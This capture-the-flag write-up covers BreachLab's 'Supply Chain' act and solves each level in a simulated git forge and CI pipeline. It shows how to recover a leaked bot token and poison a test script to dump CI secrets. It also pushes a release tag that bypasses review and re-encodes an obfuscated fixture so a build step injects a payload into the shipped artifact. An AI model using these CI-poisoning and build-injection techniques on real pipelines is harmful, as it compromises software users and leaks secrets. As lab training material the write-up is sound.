# Act IV — Supply Chain

I did NOT make the same mistake I made last time. I checked the BreachLab website and found the credentials for the Act IV machine waiting for me at the bottom of the page :)


## The Deletion That Wasn't

<p align="center"><img src="images/image-50.png" alt="" width="600"></p>

There was a `.gitconfig` file in the home dir. Reading it reveals the actual directory of the git repo

<p align="center"><img src="images/image-51.png" alt="" width="600"></p>

Then, we can check for dangling commits with `git fsck --lost-found`. There was one found. Using `git show`, to view the commit and get the flag.

<p align="center"><img src="images/image-52.png" alt="" width="600"></p>


## The Config Runs You

I need to find the `kael.txt` for this challenge. I found a hidden folder `.halcyon` in the home directory with a bunch of kael files:

<p align="center"><img src="images/image-53.png" alt="" width="600"></p>

Looking at the filenames, I'm assuming these are all the briefings for this act. It should be arranged like this:

1. The Config Runs You --> `kael.txt`
2. The Release Is Not The Source --> `kael-release.txt`
3. Signed, Not Safe --> `kael-signing.txt`
4. Policy, Not Physics --> `kael-branch.txt`
5. Ship It --> `kael-ship.txt`, `ship-order.txt`

`branch-protection.txt` --> Explains that main is protected. Changes reach it only through a reviewed pull request with passing CI and a linear history. Direct pushes and force pushes are rejected. Pushing a tag that matches release-* ships the release straight to the fleet, skipping the review requirement.

<p align="center"><img src="images/image-55.png" alt="" width="600"></p>

Let's begin. I found a few interesting files running with `ps aux`

<p align="center"><img src="images/image-54.png" alt="" width="600"></p>

```
/usr/local/sbin/forge.py
/usr/local/sbin/mock-ci.py
/usr/local/sbin/mock-signer
/usr/local/sbin/mock-fleet.
```

What `forge.py` does:

It's a small HTTPS server on 127.0.0.1:443 that makes a bare git repo reachable over smart HTTP. It doesn't interpret git operations itself. It passes each request to git-http-backend as a CGI subprocess, the same way hosted forges use that backend under their own UI and auth layers.

The content-level rules (branch protection, the CODEOWNERS protected-path check) live in the bare repo's pre-receive hook, not here. This process only decides who may attempt a push at all.

To get these rule files, we need to clone the repo. Looking at `forge.py`:

```python
HOST = "127.0.0.1"
PORT = 443

GIT_PROJECT_ROOT = "/srv/git"
GIT_HTTP_BACKEND = "/usr/lib/git-core/git-http-backend"
CERT_PATH = "/run/dev/forge.crt"
KEY_PATH = "/run/dev/forge.key"
```

So that means we can clone the repo with `git clone https://127.0.0.1/halcyon/deploy-agent.git final`

<p align="center"><img src="images/image-56.png" alt="" width="600"></p>

Great, we now have the rule files here. Let's continue by looking at `mock-ci.py`. There are some comments of note:

```python
# For each queued push: `git clone -q --branch <ref>` the bare repo into a
# scratch workspace, read `.halcyon-ci.yml` for the `test` stage's script,
# and run it AS THE UNPRIVILEGED `ci` IDENTITY (Ruling D, SECURITY, hard
# requirement) via `setpriv`, with the per-session CI secret (once Task 6
# mints /run/dev/ci-secret) injected ONLY into that job's own environment
# as CI_DEPLOY_KEY. This process itself runs as root (started by
# entrypoint.sh's start_mock_ci, before any player has gated in) and reads
# /run/dev/ci-secret as root -- but the player-controlled build/test file
# (`make test` -> `tests/run.sh`, poisonable from L14 onward) NEVER runs as
# root. Running it as root would let an indirect PPE read /run/dev/secret
# (the HMAC master) and mint every flag in the game -- an anti-skip break.
# The `ci` account (provision/users.sh) has no membership, no sudo, and no
# read access to anything under /run/dev/ -- it only ever sees what this
# process hands it explicitly via env.
```

So, we need to poison `tests/run.sh` to print CI_DEPLOY_KEY, which is an env variable in the `ci` user's environment. Here's the effective flow:

1. Create a non-release branch: `git checkout -b "test-integration/l14"`

I also added these to my environment:

```bash
export CI_BOT_TOKEN='<from dangling commit>'
export REMOTE="https://ci-bot:${CI_BOT_TOKEN}@git.halcyon.internal/halcyon/deploy-agent.git"
```

2. Poison `run.sh`:

```bash
cat > tests/run.sh <<'EOF'
#!/usr/bin/env bash
env

exit 0
EOF
```

3. Commit and push the branch to the remote server:

```sh
git add tests/run.sh
git commit -m "get flag :)"
git push "$REMOTE" "HEAD:refs/heads/test-integration/l14"
```

We can now view the flag (`CI_DEPLOY_KEY`) in the log file at `/run/dev/ci-runs`

<p align="center"><img src="images/image-57.png" alt="" width="600"></p>


## Signed, Not Safe

<p align="center"><img src="images/image-60.png" alt="" width="600"></p>

I know, I know, this is not exactly the order I stated above, but this is how I solved it. For this challenge, here is the comment of focus in `mock-ci.py`:

```python
# --- release stage (build -> sign; L16) -----------------------------------
# Reached only for a `release/*` ref (RELEASE_REF_PREFIX, Ruling G) whose
# test stage already passed. It builds the RELEASE artifact the way the
# pipeline ships it -- `make dist` produces the tarball, then the artifact
# is built FROM that tarball, which is where the L15 injection fires (a
# from-working-tree build is clean; see repo-baseimage.sh / build-aux/
# inject.sh). BOTH build steps run as the unprivileged `ci` identity
# (Ruling D): the player controls the Makefile/tests/fixture, so this build
# is attacker-influenced and must never touch root.
#
# The produced artifact then has to be read by THIS process (root) to hand
# it to the signer -- and that is the single Ruling-E hazard in the whole
# pipeline: the build ran as `ci` in a `ci`-writable workspace, so a hostile
# build can replace the artifact path with a symlink to /run/dev/secret (the
# HMAC master) hoping root follows it and gets the signer to certify -- or
# the run log to expose -- the master. _read_ci_artifact defends that read
# (see its own comment). mock-signer then signs WHATEVER it is handed (that
# is the L16 lesson): it does not re-review the source or ask whether a
# human approved the change. We verify the detached signature honestly
# (openssl vs /run/dev/signpub) and, if the just-signed artifact carries the
# L15 poison marker, write the pre-minted L16 flag into the dev-readable run
# log -- a valid signature over a poisoned artifact.
#
# NO fleet deploy on release/* (Ruling G): deploy stays gated on the
# protected deploy ref (a later task). This stage only builds + signs here.
```

This part builds a release artifact, signs it, and checks the signature. It runs only for `release/*` branches, and only after the test stage has passed.

What it does, in order:

1. Builds the artifact in two steps, both as the `ci` user. First `make dist` creates a tarball, then the artifact is built from that tarball. Building from the tarball rather than the working tree matters because the L15 injection is designed to fire only in that path.

2. Reads the artifact back as root. The daemon has to read the file to send it to the signer, and that read is the main risk in the pipeline. The `ci` build wrote into a directory `ci` can write to, so a hostile build could replace the artifact path with a symlink to `/run/dev/secret`, the HMAC master key. If root followed that link, the signer could be tricked into signing the secret, or the log could leak it. `_read_ci_artifact` guards against this.

3. Signs whatever it's given. `mock-signer` on 127.0.0.1:8200 signs the artifact without reviewing the source or checking for human approval. That's the lesson of L16: a valid signature doesn't mean the content is safe.

4. Verifies the signature honestly. It checks the detached signature with openssl against `/run/dev/signpub`.

5. Awards the L16 flag if the artifact is poisoned. If the signed artifact contains the L15 poison marker, the daemon writes the pre-minted L16 flag into the run log, which players can read. The point is that the signature is valid, but the artifact is malicious.

I actually did this level before L15, and since at this stage I had already poisoned `run.sh`, it still worked. Here's what I did to get the flag:

1. Create a release branch from the poisoned branch: `git checkout -b "release/l16"`
2. Push it to the remote server: `git push "$REMOTE" "HEAD:refs/heads/release/l16"`
3. Get the flag. We can see the flag in the logs, along with an artifact.

<p align="center"><img src="images/image-59.png" alt="" width="600"></p>

<p align="center"><img src="images/image-61.png" alt="" width="600"></p>


## The Release Is Not The Source

<p align="center"><img src="images/image-58.png" alt="" width="600"></p>

This level is easier, since we did L16 first hehehe. We know that the pipeline builds the release from a tarball, not from the working tree. The script comments say the from-working-tree build is clean and the tarball build fires the L15 injection. The tarball carries:

- files the build regenerates, which are not in the reviewed source;
- data that looks like data until the build treats it as code.

The brief simply asks us to prove that. So what we need to do is compare the clean build and the tarball build. Before doing that, I switched back to the earlier branch with `git switch test-integration/l14`, although I don't think it's necessary.

1. Clean the build and rebuild the tarball:

```bash
make clean
make build
make dist
```

<p align="center"><img src="images/image-62.png" alt="" width="600"></p>

Here we can see the tarball being created.

We can even peek inside with `tar -tzvf deploy-agent-src.tar.gz` to see that there is an `inject.sh`

<p align="center"><img src="images/image-63.png" alt="" width="600"></p>

2. Create 2 directories to store both the clean and tarball builds: `mkdir -p /tmp/l15-src /tmp/l15-rel`

3. Since we have not committed this, we can export the current branch's HEAD commit into `/tmp/l15-src`. This is essentially the "clean" build: `git archive HEAD | tar -x -C /tmp/l15-src`

4. Extracts the release tarball produced by `make dist` into `/tmp/l15-rel`: `tar -xzf deploy-agent-src.tar.gz -C /tmp/l15-rel`

5. Compare `/tmp/l15-rel` with `/tmp/l15-src` to show what the release tarball contains that the repository doesn't: `diff -ruN /tmp/l15-src /tmp/l15-rel`

This produced quite a long diff, but the key file was the `inject.sh` which had this:

```sh
fixture="${1:-tests/fixtures/corpus-good.bin}"

# Decode: the fixture is base64( payload_bytes XOR KEY ). The key lives here
# in the build machinery, not in the source -- recovering the payload means
# reading (or running) the build, which is the whole lesson. A source grep
# for the payload finds nothing, by construction. (`python3 -c` with the
# fixture PATH as an argument -- the program opens the file itself.)
payload="$(python3 -c '
import sys, base64
KEY = b"HALCYON-XZ"
data = open(sys.argv[1], "rb").read()
raw = base64.b64decode(data)
out = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(raw))
sys.stdout.write(out.decode("utf-8", "replace"))
' "$fixture")
```

This file decodes `tests/fixtures/corpus-good.bin` to reveal the flag. So, I copied the file to the clean build with: `cp /tmp/l15-rel/build-aux/inject.sh /tmp/l15-src/inject.sh`. Running it gives us the flag:

<p align="center"><img src="images/image-64.png" alt="" width="600"></p>

## Policy, Not Physics

<p align="center"><img src="images/image-65.png" alt="" width="600"></p>

This one is pretty straightforward. We need to land our changes on the release branch without tripping the check that runs every time a change is made. Let's look at `branch-protection.txt`:

```
HALCYON forge -- branch protection for halcyon/deploy-agent

Deploy target: refs/heads/main
  Protected. A change reaches main only through a reviewed pull request
  with green CI and a linear history. A direct push is rejected. A forced
  (non-fast-forward) push is rejected. There is no way to push main by hand.

Exempt deploy lane (this environment): refs/tags/release-*
  Release tags whose name matches release-* are shipped straight to the fleet by the deploy automation. A tag push in this namespace is not gated by the branch review, so it lands the release the protected branch will not take directly.
  This lane is not covered by the review requirement above. A forced
  (non-fast-forward) update to it is still rejected; the lane skips review,
  not history safety.

Note for pipeline operators: the exempt lane exists so automation can ship
without waiting on a human. Treat a push to it as a release to the fleet.
```

This explains that a push with the `refs/tags/release-*` tag format automatically lands in the release branch. So here is the attack flow:

I'm now working from the `release/l16` branch

1. Add a tag that follows the mentioned format: `git tag -a "release-l17" -m "release l17"`
2. Push it to the remote server: `git push "$REMOTE" "refs/tags/release-l17"`

We get the flag!

<p align="center"><img src="images/image-66.png" alt="" width="600"></p>

## Ship It

<p align="center"><img src="images/image-67.png" alt="" width="600"></p>

So we need to perform the entire supply chain attack and get it to print `HALCYON-FLEET-DEPLOY-04b6b7f12a833938`. Let's start from scratch:

### 1. Get the CI_BOT_TOKEN

```bash
cd /srv/git/halcyon/deploy-agent.git/
git fsck --lost-found
git show <commit hash>
```

### 2. Clone the git repo and config the env vars

```bash
cd ~
git clone https://127.0.0.1/halcyon/deploy-agent.git ship
cd ship
export CI_BOT_TOKEN=e99219de5b5a8cef757fc10c9feafbe9651713c52dfeedfb
export REMOTE="https://ci-bot:${CI_BOT_TOKEN}@git.halcyon.internal/halcyon/deploy-agent.git"
export TOKEN='HALCYON-FLEET-DEPLOY-04b6b7f12a833938'
```

### 3. Get the tarball and extract its contents

```bash
make dist
mkdir /tmp/l18-rel
tar -xzf deploy-agent-src.tar.gz -C /tmp/l18-rel
```

If we take a look at `inject.sh` again, we find the following comment on using it for L18:

```sh
# ADAPTABLE TEMPLATE (this is the mechanism you wield in L18): to deliver
# your OWN payload, re-encode tests/fixtures/corpus-good.bin with your own
# marker + string (the paired encoder, encode-fixture, uses the same
# reversible transform this decodes). Nothing else has to change: the same
# release build will pick up whatever the fixture now decodes to, compile
# it in, and -- because the emitted payload runs from a constructor -- make
# the shipped artifact PRINT it when it executes. That printed line is what
# a fleet host running the deployed artifact emits.
```

`inject.sh` reads `tests/fixtures/corpus-good.bin`, decodes it as:

```text
plaintext = base64_decode(fixture) XOR "HALCYON-XZ"   (repeating key)
```

and emits `payload.c`:

```c
const char injected_payload[] = "<decoded payload>";
__attribute__((constructor))
static void _emit_injected_payload(void) {
    printf("%s\n", injected_payload);
}
```

`release.mk` compiles that object into `deploy-agent`. We need to re-encode `tests/fixtures/corpus-good.bin` with the ship-order token, and the release build will print the token when the artifact runs.

### 4. Re-encode the fixture with the ship-order token

Start from a checkpoint that still has a green test stage.

```sh
git checkout -b "release/l18"

python3 - <<'PY'
import base64
from pathlib import Path

KEY = b"HALCYON-XZ"
TOKEN = "HALCYON-FLEET-DEPLOY-04b6b7f12a833938"
p = Path("tests/fixtures/corpus-good.bin")

raw = base64.b64decode(p.read_bytes())
original = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(raw)).decode("utf-8", "replace")

# Keep the decoded value on one line: it is embedded in a C string literal.
original = original.strip().replace("\r", " ").replace("\n", " ")
payload = (original + " " + TOKEN).strip()

encoded = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(payload.encode()))
p.write_bytes(base64.b64encode(encoded))
print(payload)
PY
```

We can see that it works during the test print

<p align="center"><img src="images/image-68.png" alt="" width="600"></p>

### 5. Commit the changes

```bash
git add tests/fixtures/corpus-good.bin
git commit -m "build: encode fleet deploy marker in release fixture"
```

### 6. Create the release tag and push

```bash
git tag -a "release-l18" -m "release l18"
git push "$REMOTE" "refs/tags/release-l18"
```

### 7. View the logs in `/run/dev/ci-runs`

The logs tell us to run `hal-fleet log`, and doing that gives us our very last flag!

<p align="center"><img src="images/image-69.png" alt="" width="600"></p>

You can also see that I made a mistake and had to push a new release, but we shall ignore that :).